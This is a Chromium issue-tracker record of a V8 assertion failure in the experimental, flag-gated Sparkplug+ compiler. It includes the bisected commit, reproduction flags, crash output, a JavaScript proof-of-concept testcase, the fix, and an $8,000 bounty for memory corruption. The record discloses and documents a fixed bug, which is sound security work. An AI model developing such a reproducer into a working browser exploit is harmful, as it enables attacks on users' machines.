# CSA_DCHECK failed: IsNotCleared(value)

| Field | Value |
|-------|-------|
| **Issue ID** | [471580187](https://issues.chromium.org/issues/471580187) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ha...@intel.com |
| **Created** | 2025-12-25 |
| **Bounty** | $8,000.00 |

## Description

## Bisect

- Version: 103495
- Commit: 2bf36e101794fe961ac3983fad216708d4254c21
- Link: <https://crrev.com/2bf36e101794fe961ac3983fad216708d4254c21>

```
commit 2bf36e101794fe961ac3983fad216708d4254c21
Author: Hao Xu <hao.a.xu@intel.com>
Date:   Tue Nov 4 21:13:40 2025 +0800

    Sparkplug+: support patchable baseline code
    
    A bytecode handler for an operation is often a generic handler that
    deal with different types of inputs. This make the baseline compiler
    to generate a call to a generic builtin for that operation. The
    generic builtin can deal with all types of inputs, but this makes the
    builtin very large and introduces a lot of branches to distinguish
    inputs' types, which hurts the performance.
    
    Sparkplug+ introduces some small and specific handlers to deal with
    one single type of input. For example, this CL introduces some small
    monomorphic handlers for builtin LoadIC to deal with one specific
    kind of IC. We will patch the baseline code to use these specific
    handlers on IC misses dynamically.
    
    Bug: chromium:429351411
    Change-Id: I85f842ae4050eebbdd8d25d5e113deae743c95d0
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6627216
    Commit-Queue: Xu, Hao A <hao.a.xu@intel.com>
    Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#103495}

```
## Reproduction

1. Download: `gs://v8-asan/linux-debug/d8-linux-debug-v8-component-103495.zip`
2. Run: `d8 --allow-natives-syntax --fuzzing --sparkplug-plus --stress-gc-during-compilation poc.js`

## Crash Output

```
----------------------------------------
--------------------------------------------------------------------------------
abort: CSA_DCHECK failed: IsNotCleared(value) [../../src/codegen/code-stub-assembler.cc:2812]

Stacktrace:
ptr0=0x3714001f8101
ptr1=0x7fed20002e90
ptr2=(nil)
ptr3=(nil)
ptr4=(nil)
ptr5=(nil)
failure_message_object=0x7ffd2b4f6b18
...
----------------------------------------

```
## PoC

```
try {
  gc;
} catch (e) {
  this.gc = function () {};
}

function missingDesc() {
  return typeof desc === 'undefined';
}

function scanProps(obj, type) {
  let properties = [];
  for (let name of Object.getOwnPropertyNames(obj)) {
    if (missingDesc(obj, name, type)) properties.push(name);
  }
  let proto = Object.getPrototypeOf(obj);
  while (proto && proto != Object.prototype) {
    Object.getOwnPropertyNames(proto).forEach(name => {
      if (name !== '') {
        if (missingDesc()) properties.push();
      }
    });
    proto = Object.getPrototypeOf(proto);
  }
  return properties;
}

{
  selectProp = function (obj, seed) {
    let properties = scanProps(obj);
    return properties[seed % properties.length];
  };
}

function walkValue(v5) {
  try {
    for (var v7 = 0; v7 < v5.length; v7++) {}
  } catch (v7) {}
}

function runWorklist() {
  for (const v14 of v0) {
    walkValue(v14);
  }
}

var v0 = ['', '', '', '', '', '', '', 0];

v0[selectProp(v0)] = 0;
v0.__proto__.__proto__ = BigInt.prototype;
v0[selectProp(v0, 0)] = /0/;
Object.prototype.length = 3642395160;
runWorklist();
// Flags: --allow-natives-syntax --fuzzing --sparkplug-plus --stress-gc-during-compilation

```

## Timeline

### cl...@appspot.gserviceaccount.com (2025-12-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5151382516465664.

### 24...@project.gserviceaccount.com (2025-12-26)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-12-26)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/2bf36e101794fe961ac3983fad216708d4254c21 (Sparkplug+: support patchable baseline code

A bytecode handler for an operation is often a generic handler that
deal with different types of inputs. This make the baseline compiler
to generate a call to a generic builtin for that operation. The
generic builtin can deal with all types of inputs, but this makes the
builtin very large and introduces a lot of branches to distinguish
inputs' types, which hurts the performance.

Sparkplug+ introduces some small and specific handlers to deal with
one single type of input. For example, this CL introduces some small
monomorphic handlers for builtin LoadIC to deal with one specific
kind of IC. We will patch the baseline code to use these specific
handlers on IC misses dynamically.

Bug: chromium:429351411
Change-Id: I85f842ae4050eebbdd8d25d5e113deae743c95d0
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6627216
Commit-Queue: Xu, Hao A <hao.a.xu@intel.com>
Reviewed-by: Leszek Swirski <leszeks@chromium.org>
Cr-Commit-Position: refs/heads/main@{#103495}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2025-12-26)

Detailed Report: https://clusterfuzz.com/testcase?key=5151382516465664

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: ASSERT
Crash Address: 
Crash State:
  CSA_DCHECK failed: IsNotCleared(value)
  code-stub-assembler.cc
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=103494:103495

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5151382516465664

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### sk...@google.com (2025-12-26)

Setting provisional high severity

### ha...@intel.com (2025-12-27)

Thanks for reporting this issue! Currently this is guarded by a flag that is by-default off, I'm wondering if there is any deadline for merging the fix because I guess people are OOO these days.

### ch...@google.com (2025-12-27)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-12-27)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### go...@google.com (2025-12-30)

[Bulk Edit]

Reminder M144 is already in Beta and  Early Stable RC cut is coming soon right after holidays at 10:00 AM PT, Tuesday Jan 6th.

Please review this bug and assess if this is indeed a RBS. 
If not, please remove the RBS label. If so, please make sure to land the fix and request a merge into the release branch ASAP. Thank you.

### ch...@google.com (2025-12-31)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### om...@chromium.org (2026-01-01)

Setting `Security_Impact-None` since this is behind a disabled-by-default flag, and updating priority to P2 accordingly.

### dx...@google.com (2026-01-07)

Project: v8/v8  

Branch:  main  

Author:  Hao Xu [hao.a.xu@intel.com](mailto:hao.a.xu@intel.com)  

Link:    <https://chromium-review.googlesource.com/7406752>

[sparkplug+] Avoid loading cleared value in DataHandler

---


Expand for full commit details
```
     
    GC can clear the cached value in DataHandler. We fall back to the 
    runtime function in this situation. 
     
    Bug: 429351411,471580187 
    Change-Id: I0569b14ad54069a36a36e41c520c0423cd5d6b5d 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7406752 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Xu, Hao A <hao.a.xu@intel.com> 
    Cr-Commit-Position: refs/heads/main@{#104506}

```

---

Files:

- M `src/ic/accessor-assembler.cc`

---

Hash: [97f7ae33de62b200a31cd982d5a223dc7b04c49b](https://chromiumdash.appspot.com/commit/97f7ae33de62b200a31cd982d5a223dc7b04c49b)  

Date: Wed Jan 7 08:39:28 2026


---

### 24...@project.gserviceaccount.com (2026-01-08)

ClusterFuzz testcase 5151382516465664 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=104505:104506

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### sp...@google.com (2026-01-16)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
baseline memory corruption in sandboxed process with a bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-04-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> baseline memory corruption in sandboxed process with a bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/471580187)*
